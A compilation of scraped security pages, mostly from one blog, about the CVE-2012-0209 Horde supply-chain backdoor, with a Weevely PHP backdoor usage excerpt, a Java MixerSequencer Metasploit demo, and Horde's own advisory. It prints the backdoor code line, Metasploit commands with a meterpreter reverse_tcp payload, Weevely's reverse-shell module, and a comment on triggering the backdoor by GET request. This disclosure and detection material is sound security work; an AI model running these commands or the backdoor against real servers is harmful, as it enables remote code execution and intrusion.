Unfortunately for Weevely authors the Python User Agent is recognized by basic NIDS rules like Emerging Threats ([SIG 2013031](http://doc.emergingthreats.net/bin/view/Main/2013031)).

```
Oct 11 22:31:27 fw3 snort[4069]: [1:2013031:1] ET POLICY Python-urllib/ Suspicious User Agent [Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.178.25:54037 -> 192.168.178.61:80
```

Also unfortunately for Weevely authors, if you have PHP safe\_mode enabled, you will also have this typical kind of logs in you error.log file. A regular Log review activity will detect this kind of errors.

```
[Tue Oct 11 00:44:25 2011] [error] [client 192.168.178.25] PHP Warning:  ini_set(): SAFE MODE Restriction in effect.  The script whose uid is 33 is not allowed to access /dev/null owned by uid 0 in /var/www/mybb/readm
e.php(1) : eval()'d code on line 1, referer: http://www.google.com/url?sa=my&source=web&ct=7&url=http%3A//blackbox.zataz.loc/mybb/readme.php&rct=j&q=mybb readme&ei=ZWNob&usg=yA1Nz&sig2=ExNjs=
```

The actual Weevely version is identifiable by NIDS through the User Agent or by regular Log review activity, but clearly the approach is really interesting and future version

#### Weevely Usage

* **Invoke Weevely help**

To invoke Weevely help you only need to execute the following command :

[![](https://eromang.zataz.com/wp-content/uploads/Weevely-help-300x138.png "Weevely-help")](https://eromang.zataz.com/wp-content/uploads/Weevely-help.png)

* **Weevely server code generation**

To generate the “*server*” code you only need to execute the following command, where “*mypassword*” is you desired password and “*readme.php*” the backdoor PHP file how need to be uploaded on the target Web server.

[![](https://eromang.zataz.com/wp-content/uploads/Weevely-generate-300x55.png "Weevely-generate")](https://eromang.zataz.com/wp-content/uploads/Weevely-generate.png)

* **Start a telnet or ssh like session and exploitation**

To start a telnet-like (HTTP) or ssh-like (HTTPS) session you only need to execute the following command :

[![](https://eromang.zataz.com/wp-content/uploads/Weevely-start-session-300x75.png "Weevely-start-session")](https://eromang.zataz.com/wp-content/uploads/Weevely-start-session.png)

As you see in the screenshot the interpreter is “*shell.sh*” how allow you to execute shell commands. The other interpreter is “*shell.php*” how will allow you to execute PHP commands. You can also invoque the backdoor help with the “*:help*” command. Here under the list of modules with they’re methods.

```
[backdoor] [reverse_tcp] Send reverse shell using TCP socket
           :backdoor.reverse_tcp ip port

[/shell]
[sh] Execute system commands
        :shell.sh ""

[/php]
 Execute single PHP commands
        :shell.php ";"

[find] [perms] Find files with write, read, execute permissions
       :find.perms first|all file|dir|all w|r|x|all

       [webdir] Find writable directory and get corresponding URL
       :find.webdir

       [suidsgid] Find suid, sgid, or every file with superuser flag
       :find.suidsgid suid|sgid|all

       [binaries] Find executables in common PATH folders
       :find.binaries all |

       [name] Find files with name that match string
       (e=equal, ei= equal case insensitive , c= contains, ci= contains case insensitive)
       :find.name e|ei|c|ci

[file] [read] Read file outside web root using different techniques
       :file.read

       [download] Download remote binary/ascii files
       :file.download

       [upload] Upload local binary/ascii file using POST method
       :file.upload

       [check] Check remote files presence, type, md5 and permissions
       :file.check  exists|file|dir|md5|r|w|x

[system] [info] Collect system informations
         :system.info all|whoami|hostname|basedir|document_root

         [users] Enumerate system users using different techniques
         :system.users
```

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from eromang.zataz.com_f2e58b0f_20250126_054644.html ===


[# Eric Romang Blog

## aka wow on ZATAZ.com](https://eromang.zataz.com/ "Eric Romang Blog")
Menu
[Skip to content](#content "Skip to content")

Search for:

# CVE-2010-0842 Java MixerSequencer Vulnerability Metasploit Demo

[17/02/2012](https://eromang.zataz.com/2012/02/17/cve-2010-0842-java-mixersequencer-vulnerability-metasploit-demo/ "Permalink to CVE-2010-0842 Java MixerSequencer Vulnerability Metasploit Demo")[Exploits](https://eromang.zataz.com/category/exploits/), [Metasploit](https://eromang.zataz.com/category/metasploit-pen-test/)[Java](https://eromang.zataz.com/tag/java/), [Oracle](https://eromang.zataz.com/tag/oracle/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

#### Timeline :

Vulnerability reported to ZDI by Peter Vreugdenhil

Vulnerability reported to the vendor by ZDI the 2009-12-10

Coordinated public release of the vulnerability the 2010-04-05

Details of the vulnerability and first PoC disclosed the 2010-05-21

Metasploit PoC provided the 2012-02-15

#### **PoC provided by :**

Peter Vreugdenhil

juan vazquez

#### **Reference(s) :**

[CVE-2010-0842](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0842)

[OSVDB-63493](http://osvdb.org/show/osvdb/63493)

[ZDI-10-060](http://www.zerodayinitiative.com/advisories/ZDI-10-060/)

#### **Affected version(s) :**

Java 6 before or equal to update 18

#### **Tested on Windows 7 Integral** with :

Java 6 Update 18

Internet Explorer 9

#### **Description :**

This module exploits a flaw within the handling of MixerSequencer objects in Java 6u18 and before. Exploitation id done by supplying a specially crafted MIDI file within an RMF File. When the MixerSequencer objects is used to play the file, the GM\_Song structure is populated with a function pointer provided by a SONG block in the RMF. A Midi block that contains a MIDI with a specially crafted controller event is used to trigger the vulnerability. When triggering the vulnerability “ebx” points to a fake event in the MIDI file which stores the shellcode. A “jmp ebx” from msvcr71.dll is used to make the exploit reliable over java updates.

#### **Commands :**

```
use exploit/windows/browser/java_mixer_sequencer
set SRVHOST 192.168.178.100
SET PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.178.100
exploit

sysinfo
getuid
```

# Post navigation

[← CVE-2012-0209 Horde backdoor analysis](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/) [CVE-2012-0209 Horde 3.3.12 Backdoor Metasploit Demo →](https://eromang.zataz.com/2012/02/17/cve-2012-0209-horde-3-3-12-backdoor-metasploit-demo/)

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from access.redhat.com_2535e4ef_20250126_054644.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from eromang.zataz.com_758c04f5_20250126_054633.html ===


[# Eric Romang Blog

## aka wow on ZATAZ.com](https://eromang.zataz.com/ "Eric Romang Blog")
Menu
[Skip to content](#content "Skip to content")

Search for:

# Tag Archives: Horde

# [CVE-2012-0209 Horde 3.3.12 Backdoor Metasploit Demo](https://eromang.zataz.com/2012/02/17/cve-2012-0209-horde-3-3-12-backdoor-metasploit-demo/)

[17/02/2012](https://eromang.zataz.com/2012/02/17/cve-2012-0209-horde-3-3-12-backdoor-metasploit-demo/ "Permalink to CVE-2012-0209 Horde 3.3.12 Backdoor Metasploit Demo")[Exploits](https://eromang.zataz.com/category/exploits/), [Metasploit](https://eromang.zataz.com/category/metasploit-pen-test/)[Backdoor](https://eromang.zataz.com/tag/backdoor/), [Horde](https://eromang.zataz.com/tag/horde/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

#### Timeline :

Public release of the vulnerability the 2012-02-13

Details of the vulnerability and first PoC disclosed by Eric Romang the 2012-02-15

Metasploit PoC provided the jduck 2012-02-16

#### **PoC provided by :**

[Eric Romang](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/ "CVE-2012-0209 Horde backdoor analysis")

jduck

#### **Reference(s) :**

[CVE-2012-0209](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0209)

#### **Affected version(s) :**

Horde 3.3.12 downloaded between November 15 and February 7

Horde Groupware 1.2.10 downloaded between November 9 and February 7

Horde Groupware Webmail Edition 1.2.10 downloaded between November 2 and February 7

#### **Tested on Ubuntu 11.10** with :

Horde 3.3.12

#### **Description :**

This module exploits an arbitrary PHP code execution vulnerability introduced as a backdoor into Horde 3.3.12 and Horde Groupware 1.2.10.

#### **Commands :**

```
use exploit/multi/http/horde_href_backdoor
set VHOST devnull.zataz.loc
set RHOST 192.168.178.100
set PAYLOAD cmd/unix/generic
set CMD uname -a
exploit
```

# [CVE-2012-0209 Horde backdoor analysis](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/)

[15/02/2012](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/ "Permalink to CVE-2012-0209 Horde backdoor analysis")[Reverse Engineering](https://eromang.zataz.com/category/reverse-engineering/)[Backdoor](https://eromang.zataz.com/tag/backdoor/), [Horde](https://eromang.zataz.com/tag/horde/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

[![](https://eromang.zataz.com/wp-content/uploads/horde-color.gif "horde-color")](https://eromang.zataz.com/wp-content/uploads/horde-color.gif)The 13/02 **[Horde](http://www.horde.org/)** team has release a **[security alert](http://dev.horde.org/h/jonah/stories/view.php?channel_id=1&id=155)** concerning their products. An unknown intruder has hack the FTP server of Horde since minimum November 02 2011 and has manipulate three Horde releases to allow unauthenticated remote PHP execution. The intruder has maintain access to the servers until February 7. The issue is currently tracked through **[CVE-2012-0209](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0209)**.

The affected releases are:

* Horde 3.3.12 downloaded between November 15 and February 7
* Horde Groupware 1.2.10 downloaded between November 9 and February 7
* Horde Groupware Webmail Edition 1.2.10 downloaded between November 2 and February 7

**Horde 4 is not affected**, the CVS and Git repositories seem to not be affected, but some Linux distributions how have download the code source from the Horde FTP server are affected. Horde team is providing version 3.3.13 for Horde, 1.2.11 for Horde Groupware and Horde Groupware Webmail Edition to remove the discovered backdoor and has also clean the FTP server.

After some researches, I found two vulnerable Linux distribution how are delivering the backdoored Horde 3.3.12. These distributions are **[Ubuntu precise](http://packages.ubuntu.com/precise/horde3)**, **[Debian wheezy](http://packages.debian.org/wheezy/horde3)** and **[sid](http://packages.debian.org/sid/horde3)**. **Fedora Rawhide** doesn’t seem to be impacted unless the distributed version is also [3.3.12](https://bugzilla.redhat.com/show_bug.cgi?id=789555), same for **OpenSUSE** 12.1. **Gentoo**, **Mandriva** and **Slackware** doesn’t seem to deliver this version. The impact through Linux distribution should be not so important. Only users how have download the source code from FTP are mainly affected.

The backdoor is located, for Horde 3.3.12, in the “*templates/javascript/open\_calendar.js*” script.

`link.href = '# php (isset($_COOKIE["href"]) && preg_match("/(.*):(.*)/", $_COOKIE["href"], $m))?$m[1]($m[2]):"";?>';`

Take a look on the following **[Pastebin](http://pastebin.com/bcXZYcMb)** for the diff between a clean and a backdoored 3.3.12 version.

As you can see, if the cookie contain an array named “*href*” and if the content of the href variable look like to, for example, “*shell\_exec:’uname -a’*“, the PHP function will be executed. Now that we have found the backdoor, how is this backdoor activated ?

All my previous analysis were false, after trying to exploit without success the backdoor, I have finally discover the vulnerable script.

The vulnerable script is “*/services/javascript.php*“. If you take a look a the script you can see that you need to do a POST request with two variables on the top of the necessary cookie.

 `$app = Util::getFormData('app', Util::nonInputVar('app'));

$file = Util::getFormData('file', Util::nonInputVar('file'));

if (!empty($app) && !empty($file) && strpos($file, '..') === false) {

$script_file = $registry->get('templates', $app) . '/javascript/' . $file;

if (file_exists($script_file)) {

 $registry->pushApp($app, false);

 $script = Util::bufferOutput('require', $script_file);

if ($send_headers) {

Horde::compressOutput();

header('Cache-Control: no-cache');

header('Content-Type: text/javascript');

}

echo $script;

}

}`

“*app*” variable is one of the application how is active on the Horde installation, the applications are configured in the “*/config/registry.php*” file.

 `$this->applications['horde'] = array(

'fileroot' => dirname(__FILE__) . '/..',

'webroot' => _detect_webroot(),

'initial_page' => 'login.php',

'name' => _("Horde"),

'status' => 'active',

'templates' => dirname(__FILE__) . '/../templates',

'provides' => 'horde',

);`

“*file*” variable should be the backdoored JavaScript file aka “*open\_calendar.js*“. After that you have provide the two variables and the “*href*” cookie, the backdoor is executed. I have develop a PoC in order to exploit the backdoor. You can find this PoC on my **[Pastebin](http://pastebin.com/U3ADiWrP)**.

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from eromang.zataz.com_661e9460_20250125_034609.html ===


[# Eric Romang Blog

## aka wow on ZATAZ.com](https://eromang.zataz.com/ "Eric Romang Blog")
Menu
[Skip to content](#content "Skip to content")

Search for:

# CVE-2012-0209 Horde backdoor analysis

[15/02/2012](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/ "Permalink to CVE-2012-0209 Horde backdoor analysis")[Reverse Engineering](https://eromang.zataz.com/category/reverse-engineering/)[Backdoor](https://eromang.zataz.com/tag/backdoor/), [Horde](https://eromang.zataz.com/tag/horde/)[wow](https://eromang.zataz.com/author/admin/ "View all posts by wow")

[![](https://eromang.zataz.com/wp-content/uploads/horde-color.gif "horde-color")](https://eromang.zataz.com/wp-content/uploads/horde-color.gif)The 13/02 **[Horde](http://www.horde.org/)** team has release a **[security alert](http://dev.horde.org/h/jonah/stories/view.php?channel_id=1&id=155)** concerning their products. An unknown intruder has hack the FTP server of Horde since minimum November 02 2011 and has manipulate three Horde releases to allow unauthenticated remote PHP execution. The intruder has maintain access to the servers until February 7. The issue is currently tracked through **[CVE-2012-0209](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0209)**.

The affected releases are:

* Horde 3.3.12 downloaded between November 15 and February 7
* Horde Groupware 1.2.10 downloaded between November 9 and February 7
* Horde Groupware Webmail Edition 1.2.10 downloaded between November 2 and February 7

**Horde 4 is not affected**, the CVS and Git repositories seem to not be affected, but some Linux distributions how have download the code source from the Horde FTP server are affected. Horde team is providing version 3.3.13 for Horde, 1.2.11 for Horde Groupware and Horde Groupware Webmail Edition to remove the discovered backdoor and has also clean the FTP server.

After some researches, I found two vulnerable Linux distribution how are delivering the backdoored Horde 3.3.12. These distributions are **[Ubuntu precise](http://packages.ubuntu.com/precise/horde3)**, **[Debian wheezy](http://packages.debian.org/wheezy/horde3)** and **[sid](http://packages.debian.org/sid/horde3)**. **Fedora Rawhide** doesn’t seem to be impacted unless the distributed version is also [3.3.12](https://bugzilla.redhat.com/show_bug.cgi?id=789555), same for **OpenSUSE** 12.1. **Gentoo**, **Mandriva** and **Slackware** doesn’t seem to deliver this version. The impact through Linux distribution should be not so important. Only users how have download the source code from FTP are mainly affected.

The backdoor is located, for Horde 3.3.12, in the “*templates/javascript/open\_calendar.js*” script.

`link.href = '# php (isset($_COOKIE["href"]) && preg_match("/(.*):(.*)/", $_COOKIE["href"], $m))?$m[1]($m[2]):"";?>';`

Take a look on the following **[Pastebin](http://pastebin.com/bcXZYcMb)** for the diff between a clean and a backdoored 3.3.12 version.

As you can see, if the cookie contain an array named “*href*” and if the content of the href variable look like to, for example, “*shell\_exec:’uname -a’*“, the PHP function will be executed. Now that we have found the backdoor, how is this backdoor activated ?

All my previous analysis were false, after trying to exploit without success the backdoor, I have finally discover the vulnerable script.

The vulnerable script is “*/services/javascript.php*“. If you take a look a the script you can see that you need to do a POST request with two variables on the top of the necessary cookie.

 `$app = Util::getFormData('app', Util::nonInputVar('app'));

$file = Util::getFormData('file', Util::nonInputVar('file'));

if (!empty($app) && !empty($file) && strpos($file, '..') === false) {

$script_file = $registry->get('templates', $app) . '/javascript/' . $file;

if (file_exists($script_file)) {

 $registry->pushApp($app, false);

 $script = Util::bufferOutput('require', $script_file);

if ($send_headers) {

Horde::compressOutput();

header('Cache-Control: no-cache');

header('Content-Type: text/javascript');

}

echo $script;

}

}`

“*app*” variable is one of the application how is active on the Horde installation, the applications are configured in the “*/config/registry.php*” file.

 `$this->applications['horde'] = array(

'fileroot' => dirname(__FILE__) . '/..',

'webroot' => _detect_webroot(),

'initial_page' => 'login.php',

'name' => _("Horde"),

'status' => 'active',

'templates' => dirname(__FILE__) . '/../templates',

'provides' => 'horde',

);`

“*file*” variable should be the backdoored JavaScript file aka “*open\_calendar.js*“. After that you have provide the two variables and the “*href*” cookie, the backdoor is executed. I have develop a PoC in order to exploit the backdoor. You can find this PoC on my **[Pastebin](http://pastebin.com/U3ADiWrP)**.

# Post navigation

[← SUC029 : WordPress TimThumb RFI Web Scanner/Robot](https://eromang.zataz.com/2012/02/13/suc029-wordpress-timthumb-rfi-web-scannerrobot/) [CVE-2010-0842 Java MixerSequencer Vulnerability Metasploit Demo →](https://eromang.zataz.com/2012/02/17/cve-2010-0842-java-mixersequencer-vulnerability-metasploit-demo/)

## 3 thoughts on “CVE-2012-0209 Horde backdoor analysis”

1. Pingback: [Trojan in Horde 3.3.12, Horde Groupware 1.2.10, and Horde Groupware Webmail Edition 1.2.10 | Web Security Watch](http://www.websecuritywatch.com/trojan-in-horde-3-3-12-horde-groupware-1-2-10-and-horde-groupware-webmail-edition-1-2-10/)
3. **Tester0** says:
   [13/03/2012 at 11:12](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/#comment-7846)

   Hey I obtained <http://pear.php.net/package/HTTP_Request2/download>

   which was probably missing in my setup.

   Still your PoC neither sends any packer nor returns any error. I am on Win XP.

   What am I missing ?

   Any inputs ?
5. **[Michael Meyer](http://www.greenbone.net)** says:
   [17/02/2012 at 10:30](https://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/#comment-7197)

   > If you take a look a the script you can see that you need to do a POST request with two variables on > the top of the necessary cookie.

   It does not matter whether a POST or a GET request is sent.

   services/javascript.php

   $app = Util::getFormData(‘app’, Util::nonInputVar(‘app’));

   $file = Util::getFormData(‘file’, Util::nonInputVar(‘file’));

   then in

   “ib/Horde/Util.php”

   function getFormData($var, $default = null){

   return (($val = Util::getPost($var)) !== null)

   ? $val : Util::getGet($var, $default);

   }

   So a simple GET request to ‘/services/javascript.php?app=horde&file=open\_calendar.js’ with the necessary cookie will work too.

Comments are closed.

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from lists.horde.org_0ab8c46d_20250125_034610.html ===

# [announce] [SECURITY] Remote execution backdoor after server hack (CVE-2012-0209)

**Jan Schneider**
jan at horde.org

*Mon Feb 13 14:27:50 UTC 2012*

* Previous message: [[announce] Horde Groupware Webmail Edition 1.2.11 (final)](000750.html)
* Next message: [[announce] Content 1.0.3 (final)](000752.html)
* **Messages sorted by:**
  [[ date ]](date.html#751)
  [[ thread ]](thread.html#751)
  [[ subject ]](subject.html#751)
  [[ author ]](author.html#751)

---

```
Dear Horde users,

a few days ago we became aware of a manipulated file on our FTP
server. Upon further investigation we discovered that the server has
been hacked earlier, and three releases have been manipulated to allow
unauthenticated remote PHP execution.
We have immediately taken down all distribution servers to further
analyze the extent of this incident, and we have worked closely with
various Linux distributions to coordinate our response.
Since then the FTP and PEAR servers have been replaced and further
secured. Clean versions of our releases have been uploaded.

This issue will be tracked as CVE-2012-0209:
<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0209>

We have been able to limit the manipulation to three files downloaded
during a certain timeframe. The affected releases are:
- Horde 3.3.12 downloaded between November 15 and February 7
- Horde Groupware 1.2.10 downloaded between November 9 and February 7
- Horde Groupware Webmail Edition 1.2.10 downloaded between November 2
and February 7

No other releases have been affected. Specifically, no Horde 4
releases were compromised. Our CVS and Git repositories are not
affected either. Linux distributions that are affected will notify and
provide security releases individually.

If you are not sure whether you are affected or want to verify
manually whether you are affected, you can search for this signature
in your Horde directory tree:

$m[1]($m[2])

We recommend that all users of the affected version immediately
re-install using fresh copies downloaded from our FTP server, or to
upgrade to the more recent versions that have been released since
then. This is a list of suggested replacements and their MD5 checksums:

bc04ce4499af24a403429c81d0a8afcf
ftp://ftp.horde.org/pub/horde/horde-3.3.12.tar.gz
5a0486a5f6f96a9957e770ddabe71b38
ftp://ftp.horde.org/pub/horde/horde-3.3.13.tar.gz
4bdab16c84513bbd9466cb0dc7464661
ftp://ftp.horde.org/pub/horde-groupware/horde-groupware-1.2.10.tar.gz
fed921b55a8f544fba806333502cd45d
ftp://ftp.horde.org/pub/horde-groupware/horde-groupware-1.2.11.tar.gz
60e100c3e4ab59c01d30bf5eb813a182
ftp://ftp.horde.org/pub/horde-webmail/horde-webmail-1.2.10.tar.gz
6f735266449bfda2cce8b5067b16ff74
ftp://ftp.horde.org/pub/horde-webmail/horde-webmail-1.2.11.tar.gz

If you are running Horde 4, you don't need to do anything.

We apologize for the inconvenience and assure you that we are
undertaking a full security review of our procedures to prevent this
kind of incident from happening again.

If you have further questions, please ask on the Horde mailing list:
<http://www.horde.org/community/mail>

Jan.

--
The Horde Project
<http://www.horde.org/>

```

---

* Previous message: [[announce] Horde Groupware Webmail Edition 1.2.11 (final)](000750.html)
* Next message: [[announce] Content 1.0.3 (final)](000752.html)
* **Messages sorted by:**
  [[ date ]](date.html#751)
  [[ thread ]](thread.html#751)
  [[ subject ]](subject.html#751)
  [[ author ]](author.html#751)

---

[More information about the announce
mailing list](http://lists.horde.org/mailman/listinfo/announce)



=== Content from eromang.zataz.com_55985eff_20250126_054644.html ===


[# Eric Romang Blog

## aka wow on ZATAZ.com](https://eromang.zataz.com/ "Eric Romang Blog")
Menu
[Skip to content](#content "Skip to content")

Search for:

# CVE-2012-0209 Horde backdoor analysis

